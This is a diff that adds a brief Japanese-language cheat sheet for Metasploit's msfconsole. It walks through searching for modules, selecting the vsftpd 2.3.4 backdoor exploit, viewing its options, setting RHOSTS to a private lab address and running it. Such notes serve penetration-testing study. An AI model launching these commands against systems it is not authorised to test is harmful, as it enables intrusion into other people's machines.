@@ -1,0 +1,47 @@
+msfconsole使用方法
+
+1、起動
+　msfconsole
+
+2、exploit 検索
+　search metasploit -> 全検索
+　search キーワード -> キーワードに関連する検索
+　　例）search ssh
+　　　　search ftp
+
+3、exploit 指定
+　use exploitPAHT
+　　例）use exploit/unix/ftp/vsftpd_234_backdoor
+　　　　searchでPATHが出る
+
+4、option確認
+　show options
+　　vsftpd_234_backdoorの場合
+------------------------------------------------------------------------------
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target address range or CIDR identifier
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+------------------------------------------------------------------------------
+上記の例では、RHOSTSを設定してやる
+
+5、option設定
+　set RHOSTS [host]
+　　例）set RHOSTS 192.168.56.103
+　　　　set RPORT * -> とすればポートも変更できる
+
+6、実行
+　run
+  or
+　exploit
+
+
